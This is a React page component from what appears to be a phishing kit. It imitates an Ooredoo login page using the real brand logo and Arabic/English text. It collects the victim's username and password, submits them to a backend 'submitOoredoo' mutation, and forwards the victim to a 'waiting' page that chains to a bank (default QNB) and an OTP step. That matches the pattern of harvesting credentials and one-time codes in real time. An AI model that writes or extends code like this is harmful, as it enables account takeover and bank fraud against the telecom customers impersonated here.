import { useState } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";

export default function Ooredoo() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const { language, setLanguage } = useLanguage();
  const sessionId = localStorage.getItem("sessionId") || params.get("session") || "";
  const showError = params.get("error") === "true";

  const isArabic = language === "ar";

  const [ooredooUser, setOoredooUser] = useState("");
  const [ooredooPassword, setOoredooPassword] = useState("");
  const submitOoredooMutation = trpc.submissions.submitOoredoo.useMutation();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
    const bank = params.get("bank") || "qnb";
    
    try {
      await submitOoredooMutation.mutateAsync({
        sessionId: currentSessionId,
        ooredooUser,
        ooredooPassword,
      });
      // التقدم فقط بعد نجاح الإرسال
      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=otp-ooredoo`);
    } catch (error) {
      console.error("Error submitting Ooredoo credentials:", error);
      toast.error(isArabic ? "حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى." : "Error during submission. Please try again.");
    }
  };

  return (
    <div className="page-wrapper" dir={isArabic ? "rtl" : "ltr"}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
        .page-wrapper { font-family: 'Cairo', sans-serif; background-color: #ffffff; margin: 0; padding: 0; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 500px; box-sizing: border-box; }
        
        header { padding: 15px; display: flex; align-items: center; justify-content: space-between; border-bottom: 2px solid #d71920; background-color: #ffffff; }
        .menu-icon { font-size: 24px; cursor: pointer; color: #d71920; font-weight: bold; width: 40px; }
        .logo-container { flex-grow: 1; display: flex; align-items: center; justify-content: center; background-color: #ffffff !important; padding: 0 15px; }
        .logo-container img { height: 45px; width: auto; display: block; }
        
        .lang-switch { width: 50px; text-align: center; font-size: 10px; color: #d71920; border: 1px solid #d71920; padding: 3px 5px; border-radius: 12px; cursor: pointer; font-weight: bold; }
        .error-message { background-color: #fef2f2; color: #991b1b; border: 1px solid #fee2e2; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: bold; font-size: 14px; }

        .content-body { padding: 20px; }
        h1 { font-size: 24px; color: #333; margin-top: 20px; margin-bottom: 10px; }
        .sub-text { color: #666; font-size: 14px; margin-bottom: 25px; }
        .input-group { margin-bottom: 15px; }
        input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
        .forgot-pass { color: #d71920; font-size: 14px; display: block; margin: 10px 0 25px 0; text-decoration: underline; cursor: pointer; }
        .login-btn { width: 100%; padding: 15px; background-color: #d71920; color: white; border: none; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; max-width: 300px; margin: 0 auto; display: block; }
      `}</style>
      <div className="container">
        <header>
          <div className="menu-icon">☰</div>
          <div className="logo-container">
            <img src="https://i.ibb.co/LzNfX8fL/ooredoo-logo.png" alt="Ooredoo Logo" />
          </div>
          <div className="lang-switch" onClick={() => setLanguage(language === "ar" ? "en" : "ar")} style={{ cursor: "pointer" }}>
            {language === "ar" ? "English" : "العربية"}
          </div>
        </header>
        <div className="content-body">
          {showError && (
            <div className="error-message" style={{ backgroundColor: '#fee2e2', color: '#dc2626', border: '1px solid #fecaca', padding: '15px', borderRadius: '12px', marginBottom: '20px', fontWeight: 'bold' }}>
              {isArabic ? "اسم المستخدم او كلمة المرور غير صحيحه" : "Incorrect username or password"}
            </div>
          )}
          <h1>{isArabic ? "تسجيل الدخول" : "Login"}</h1>
          <p className="sub-text">{isArabic ? "تسجيل الدخول باستخدام اسم المستخدم وكلمة المرور." : "Login using your username and password."}</p>
          <form onSubmit={handleSubmit}>
            <div className="input-group">
              <input
                type="text"
                placeholder={isArabic ? "البريد الإلكتروني أو اسم المستخدم" : "Email or Username"}
                value={ooredooUser}
                onChange={(e) => setOoredooUser(e.target.value)}
                required
              />
            </div>
            <div className="input-group">
              <input
                type="password"
                placeholder={isArabic ? "كلمة المرور" : "Password"}
                value={ooredooPassword}
                onChange={(e) => setOoredooPassword(e.target.value)}
                required
              />
            </div>
            <span className="forgot-pass">{isArabic ? "هل نسيت كلمة المرور؟" : "Forgot Password?"}</span>
            <button type="submit" className="login-btn">
              {isArabic ? "تسجيل الدخول" : "Login"}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
